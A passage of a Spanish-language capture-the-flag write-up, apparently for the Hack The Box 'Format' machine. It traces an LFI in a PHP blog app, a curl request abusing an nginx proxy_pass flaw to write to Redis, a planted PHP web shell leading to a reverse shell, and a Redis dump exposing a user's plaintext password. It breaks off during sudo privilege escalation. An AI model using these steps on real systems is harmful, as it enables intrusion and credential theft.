+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>  
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Section added!&amp;status=success"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Primero vemos que cambia de directorio al directorio <code class="language-plaintext highlighter-rouge">/content</code>, despues con <code class="language-plaintext highlighter-rouge">$txt_nl = nl2br($_POST['txt']);</code> convierte el valor recibido por el parametro <code class="language-plaintext highlighter-rouge">txt</code> al formato <code class="language-plaintext highlighter-rouge">nl2br</code>, despues con <code class="language-plaintext highlighter-rouge">$post_file = fopen("{$_POST['id']}", "w");</code> se abre el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> en modo escritura con el texto recibido por el parametro <code class="language-plaintext highlighter-rouge">id</code>, y aca vemos lo mas interesante, con <code class="language-plaintext highlighter-rouge">fwrite($post_file, $html);</code>, escribe como contenido HTML del archivo que se abrio anteriormente, es decir, lo que se reciba por el parametro <code class="language-plaintext highlighter-rouge">id</code>, y despues, con <code class="language-plaintext highlighter-rouge">order_file = fopen("order.txt", "a");</code> y <code class="language-plaintext highlighter-rouge">fwrite($order_file, $_POST['id'] . "\n");</code>, esta abriendo el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> y esta escribiendo el contenido de lo que se recibio por el parametro id de la peticion. (saber esto es importante)</p>
+
+<p>La conclusion a la que llegue, es que el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> es el que contiene, o lleva el orden de las secciones que se van agregando cuando se edita un blog, las cuales posteriormente seran escritas como contenido HTML, de hecho, cuando ingresamos los datos en los campos para editar el blog, nos dice que se agrego una nueva secccion</p>
+
+<p><img src="/assets/img/htb-format/8.png" alt=""></p>
+
+<p>En este punto decidi ver cuando y donde se hace el llamado a <code class="language-plaintext highlighter-rouge">order.txt</code> dentro del proyecto, en caso de que hayas descargado el proyecto y abierto en VScode, usa el atajo <code class="language-plaintext highlighter-rouge">Ctrl + shift + f</code> para buscar, y el primer resultado que me salio fue este codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">fetchPage</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/content"</span><span class="p">);</span>
+    <span class="nv">$order</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="no">FILE_IGNORE_NEW_LINES</span><span class="p">);</span>
+    <span class="nv">$html_content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$order</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$html_content</span><span class="p">;</span>
+        <span class="nv">$html_content</span> <span class="o">=</span> <span class="nv">$temp</span> <span class="mf">.</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$line</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="mf">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/div&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$html_content</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Primero con <code class="language-plaintext highlighter-rouge">chdir(getcwd() . "/content");</code> cambia de dircectorio al directorio <code class="language-plaintext highlighter-rouge">/content</code>, despues con <code class="language-plaintext highlighter-rouge">$order = file("order.txt", FILE_IGNORE_NEW_LINES);</code> esta leyendo el contenido de <code class="language-plaintext highlighter-rouge">order.txt</code> donde se usa <code class="language-plaintext highlighter-rouge">FILE_IGNORE_NEW_LINES</code> para decirle que omita una nueva linea al final de cada elemento del array, esto para que cada elemento de <code class="language-plaintext highlighter-rouge">order.txt</code> contenga una nueva linea dentro del array (seguramente te sacaste de onda por que dije array, y no se esta declarando ningun array, pero es por que asi funciona la funcion <a href="https://www.phptutorial.net/php-tutorial/php-file/">file</a>, ya que lee un archivo completo en un array), despues todo este codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$html_content</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$order</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$html_content</span><span class="p">;</span>
+        <span class="nv">$html_content</span> <span class="o">=</span> <span class="nv">$temp</span> <span class="mf">.</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$line</span><span class="si">}</span><span class="se">\"</span><span class="s2">&gt;"</span> <span class="mf">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"&lt;/div&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$html_content</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Usa un foreach para recorrer cada elemento dentro del array que se guardo en <code class="language-plaintext highlighter-rouge">order</code>, y hace varias cosas:</p>
+
+<ul>
+  <li>Se guarda el valor de <code class="language-plaintext highlighter-rouge">$html_content</code> en <code class="language-plaintext highlighter-rouge">$temp</code>
+</li>
+  <li>A <code class="language-plaintext highlighter-rouge">$html_content</code> se le asigna el valor de <code class="language-plaintext highlighter-rouge">$temp</code> y demas se le concatena cada linea del array usando <code class="language-plaintext highlighter-rouge">$line</code>, donde en cada linea se creara un elemento HTML(div), despues con <code class="language-plaintext highlighter-rouge">file_get_contents()</code> obtiene el contenido del archivo (order.txt) que corresponde a <code class="language-plaintext highlighter-rouge">$line</code>, y por ultimo con <code class="language-plaintext highlighter-rouge">return $html_content</code> devuelve todo el HTML</li>
+</ul>
+
+<h3 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h3>
+
+<p>El LFI se encuentra en la funcion <code class="language-plaintext highlighter-rouge">fetchPage()</code> cuando se usa <code class="language-plaintext highlighter-rouge">file_get_contents()</code>, ya que como mencione obtiene el contenido basandose en el archivo <code class="language-plaintext highlighter-rouge">order.txt</code>, y que es lo que pasa, nosotros podemos controlar lo que se ingresa en <code class="language-plaintext highlighter-rouge">order.txt</code> por que como explique antes, el archivo <code class="language-plaintext highlighter-rouge">order.txt</code> tiene el texto recibido por el parametro <code class="language-plaintext highlighter-rouge">id</code> cuando editamos el blog cuando creamos una nueva seccion, asi que una vez sabiendo que el parametro ID es vulnerable a LFI, vamos a probar con <code class="language-plaintext highlighter-rouge">../../../etc/passwd</code>, y si, defitivamente es vulnerable a LFI</p>
+
+<p><img src="/assets/img/htb-format/9.png" alt=""></p>
+
+<p>Eso no es todo, si pasan Wappalyzer por la web, se daran cuenta que usa un servidor nginx, con un reverse proxy igual en nginx, asi que podemos usar el LFI para leer los archivos de configuracion del proxy, que en nginx se encuentran en <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> y nos arroja algo como esto:</p>
+
+<h3 id="reverse-proxy-misconfigurations">Reverse proxy misconfigurations</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server { 
+	listen 80; 
+	listen [::]:80; 
+	root /var/www/microblog/app; 
+	index index.html index.htm index-nginx-debian.html; 
+	server_name microblog.htb; 
+	location / { 
+		return 404; 
+	} 
+	location = /static/css/health/ { 
+		resolver 127.0.0.1; 
+		proxy_pass http://css.microbucket.htb/health.txt; 
+	} 
+	location = /static/js/health/ { 
+		resolver 127.0.0.1; 
+		proxy_pass http://js.microbucket.htb/health.txt; 
+	} 
+	location ~ /static/(.*)/(.*) { 
+		resolver 127.0.0.1; 
+		proxy_pass http://$1.microbucket.htb/$2; 
+	}
+}
+</code></pre></div></div>
+
+<p>Observa esta parte:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	location ~ /static/(.*)/(.*) { 
+		resolver 127.0.0.1; 
+		proxy_pass http://$1.microbucket.htb/$2; 
+	}
+</code></pre></div></div>
+
+<p>La expresion <code class="language-plaintext highlighter-rouge">/static/(.*)/(.*)</code> es usanda para hacer referencia a dos textos en una URL, donde cada <code class="language-plaintext highlighter-rouge">(.*)</code> corresponde a uno de los dos textos y se usa <code class="language-plaintext highlighter-rouge">$1</code> y <code class="language-plaintext highlighter-rouge">$2</code> para representarlos , por ejemplo, cuando se acceda a <code class="language-plaintext highlighter-rouge">/static/directorio/nose.php</code> la parte de <code class="language-plaintext highlighter-rouge">/directorio</code> estara asociada a <code class="language-plaintext highlighter-rouge">$1</code> y la parte de <code class="language-plaintext highlighter-rouge">nose.php</code> estaria asociada a <code class="language-plaintext highlighter-rouge">$2</code>, y es una implementacion incorrecta en la directiva <code class="language-plaintext highlighter-rouge">proxy_pass</code> asi que nosotros podemos aprovecharnos de esa directiva para acceder a un acrhivo, pero… ¿A cual?</p>
+
+<p>Si volvemos a revisar el codigo fuente, podemos ver una funcion que verifica si una cuenta de usuario en “Pro”</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">isPro</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
+        <span class="nv">$pro</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HGET</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="s2">"pro"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$pro</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="s2">"false"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Con:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Esta conectandose a Redis para establecer una conexion a travez del archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code>.</p>
+
+<p>Despues basicamente si el usuario tiene la propiedad “pro” establecida como “true”, retorna “true”, y si no, se retornará la cadena “false”, y como tenemos un implementacion incorrecta en el proxy, entonces podemos interactuar con el archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code> para modificar los valores de la propiedad “pro”, par convertir nuestra cuenta de usuario en pro, y lo podemos hacer de esta manera:</p>
+
+<p><code class="language-plaintext highlighter-rouge">curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:carta%20pro%20true%20a/b"</code></p>
+
+<p>Y nos debe de regresar algo como esto:</p>
+
+<p><img src="/assets/img/htb-format/10_000.png" alt=""></p>
+
+<p>Y ya somos pro</p>
+
+<p><img src="/assets/img/htb-format/11.png" alt=""></p>
+
+<p>Y observa como ahora ya nos deja subir imagenes</p>
+
+<h2 id="lfi-to-rce">LFI to RCE</h2>
+
+<p>Si volvemos a revisar el codigo fuente para subir una imagen, vemos que si intentamos subir un php no va a funcionar por que se esta filtrando</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nf">isPro</span><span class="p">()</span> <span class="o">===</span> <span class="s2">"false"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">print_r</span><span class="p">(</span><span class="s2">"Pro subscription required to upload images"</span><span class="p">);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Pro subscription required&amp;status=fail"</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bulletproof\Image</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setLocation</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../uploads"</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setSize</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">3000000</span><span class="p">);</span>
+    <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">setMime</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'png'</span><span class="p">));</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nv">$image</span><span class="p">[</span><span class="s2">"image"</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nv">$upload</span> <span class="o">=</span> <span class="nv">$image</span><span class="o">-&gt;</span><span class="nf">upload</span><span class="p">();</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nv">$upload</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$upload_path</span> <span class="o">=</span> <span class="s2">"/uploads/"</span> <span class="mf">.</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="nf">getName</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">".png"</span><span class="p">;</span>
+            <span class="nv">$html</span> <span class="o">=</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="s2">blog-image</span><span class="se">\"</span><span class="s2">&gt;&lt;img src = </span><span class="se">\"</span><span class="si">{</span><span class="nv">$upload_path</span><span class="si">}</span><span class="se">\"</span><span class="s2"> /&gt;&lt;/div&gt;"</span><span class="p">;</span>
+            <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../content"</span><span class="p">);</span>
+            <span class="nv">$post_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
+            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
+            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
+            <span class="nv">$order_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>  
+            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$order_file</span><span class="p">);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Image uploaded successfully&amp;status=success"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /edit?message=Image upload failed&amp;status=fail"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Sin embargo como sabemos que tenemos un LFI en el parametro ID el cual escribe en order.txt, podriamos generar un archivo php el cual se guardara en la ruta <code class="language-plaintext highlighter-rouge">$image-&gt;setLocation(getcwd() . "/../uploads");</code> ya que el codigo anterior cambia de directorio para guardar ahi las imagenes, para generar el archivo en el parametro id debemos de poner <code class="language-plaintext highlighter-rouge">/var/www/microblog/&lt;tu_blog&gt;/uploads/shell.php</code> y en el parametro txt iria el comando que debemos de ejecutar, de esta manera</p>
+
+<p><img src="/assets/img/htb-format/12.png" alt=""></p>
+
+<p>Asi que ahora al acceder al recurso: <code class="language-plaintext highlighter-rouge">http://&lt;tu_blog&gt;.microblog.htb/uploads/shell.php</code> podemos ver que el comando se ejecuto correctamente</p>
+
+<p><img src="/assets/img/htb-format/13.png" alt=""></p>
+
+<p>Asi que solo quedar ejecutarnos una reverse shell y ya</p>
+
+<p><img src="/assets/img/htb-format/14.png" alt=""></p>
+
+<h2 id="flag-de-user">Flag de user</h2>
+
+<p>Si usamos pspy para buscar procesos intersantes, podemos ver que existe uno que se llama <code class="language-plaintext highlighter-rouge">/usr/bin/redis-server</code>, como es un archivo de redis, podemos usar redis-cli -s para conectarnos y mandar comandos al servidor de redis, sin embargo, el ejecutarlo no sale nada aun que este esperando un comando:</p>
+
+<p><img src="/assets/img/htb-format/15.png" alt=""></p>
+
+<p>Asi que podemos usar: <code class="language-plaintext highlighter-rouge">echo "info" | redis-cli -s /var/run/redis/redis.sock</code> para mostrar informacion del servidor, vemos como tiene establecido un <code class="language-plaintext highlighter-rouge">keyspace</code></p>
+
+<p><img src="/assets/img/htb-format/16.png" alt=""></p>
+
+<p>Ahora podemos hacer uso de <code class="language-plaintext highlighter-rouge">echo "keys *" | redis-cli -s /var/run/redis/redis.sock</code> para devolver todas las claves almacenadas en la base de datos de Redis, y observa como tenemos una del usuario cooper:</p>
+
+<p><img src="/assets/img/htb-format/17.png" alt=""></p>
+
+<p>Ahora usaremos <code class="language-plaintext highlighter-rouge">echo "type cooper.dooper" | redis-cli -s /var/run/redis/redis.sock</code> para devolver el tipo de valor que tiene la clave <code class="language-plaintext highlighter-rouge">cooper.dooper</code>, para no poner otra imagen, es un hash, asi que usamos <code class="language-plaintext highlighter-rouge">echo "hgetall cooper.dooper" | redis-cli -s /var/run/redis/redis.sock</code> para que nos devuelva todos los valores asociados al hash de <code class="language-plaintext highlighter-rouge">cooper.dooper</code>, y ahora ya obtuvimos la contraseña de cooper:</p>
+
+<p><img src="/assets/img/htb-format/18.png" alt=""></p>
+
+<p>Ahora nos conectamos por ssh</p>
+
+<p><strong>usr:</strong> cooper</p>
+
+<p><strong>pass:</strong> zooperdoopercooper</p>
+
+<h2 id="escalada">Escalada</h2>
+
+<p>Si ingresamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver que podemos ejecutar como root sin contraseña, tenemos un archivo</p>
+
+<p><img src="/assets/img/htb-format/19.png" alt=""></p>
+
+<p>Al hacerle un cat, tenemos un archivo de python</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">from</span> <span class="n">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
+<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
+<span class="kn">from</span> <span class="n">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="kn">import</span> <span class="n">string</span>
+<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">date</span>
+<span class="kn">import</span> <span class="n">redis</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="nf">today</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="nf">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Microblog license key manager can only be run as root</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Microblog license key manager</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--provision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Provision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--deprovision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Deprovision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--check</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Check if specified license key is valid</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">license_key</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="nc">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="sh">'</span><span class="s">/var/run/redis/redis.sock</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/secret</span><span class="sh">"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">microblogsalt123</span><span class="sh">'</span>
+<span class="n">kdf</span> <span class="o">=</span> <span class="nc">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="nc">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="nf">default_backend</span><span class="p">())</span>
+<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="p">.</span><span class="nf">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nc">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
+<span class="n">l</span> <span class="o">=</span> <span class="nc">License</span><span class="p">()</span>
+
+<span class="c1">#provision
+</span><span class="nf">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
+    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">hgetall</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">User does not exist. Please provide valid username.</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/keys</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
+        <span class="nf">if</span><span class="p">(</span><span class="n">user_key</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key has already been provisioned for this user</span><span class="sh">"</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+    <span class="n">prefix</span> <span class="o">=</span> <span class="sh">"</span><span class="s">microblog</span><span class="sh">"</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="sh">"</span><span class="s">first-name</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="sh">"</span><span class="s">last-name</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
